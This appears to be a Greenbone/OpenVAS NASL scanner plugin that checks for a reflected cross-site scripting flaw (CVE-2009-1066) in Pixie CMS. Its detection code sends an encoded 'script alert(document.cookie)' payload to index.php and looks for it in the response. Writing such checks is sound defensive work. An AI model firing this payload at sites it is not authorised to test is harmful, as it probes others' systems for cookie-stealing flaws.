# SPDX-FileCopyrightText: 2009 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100066");
  script_version("2023-07-27T05:05:08+0000");
  script_tag(name:"last_modification", value:"2023-07-27 05:05:08 +0000 (Thu, 27 Jul 2023)");
  script_tag(name:"creation_date", value:"2009-03-20 13:11:29 +0100 (Fri, 20 Mar 2009)");
  script_cve_id("CVE-2009-1066");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_name("Pixie CMS SQL Injection and Cross Site Scripting Vulnerabilities");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2009 Greenbone AG");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"Pixie CMS is prone to an SQL-injection vulnerability and a cross-site
 scripting vulnerability because it fails to sufficiently sanitize
 user-supplied data.");

  script_tag(name:"impact", value:"Exploiting these issues could allow an attacker to steal cookie-based
 authentication credentials, compromise the application, access or
 modify data, or exploit latent vulnerabilities in the underlying
 database.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/34189");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port(default:80);
if(!http_can_host_php(port:port)) exit(0);

foreach dir( make_list_unique( "/cms", http_cgi_dirs( port:port ) ) ) {

 if( dir == "/" ) dir = "";
 url = string(dir, "/index.php?s=blog&m=permalink&x=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E");

 req = http_get(item:url, port:port);
 buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
 if( ! buf ) continue;

 if ( buf =~ "^HTTP/1\.[01] 200" &&
     (egrep(pattern: "Pixie Powered", string: buf) || (egrep( pattern:"Set-Cookie: bb2_screener_", string: buf))) &&
      egrep(pattern:".*<script>alert\(document\.cookie\)</script>.*", string: buf, icase: TRUE) )
 {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
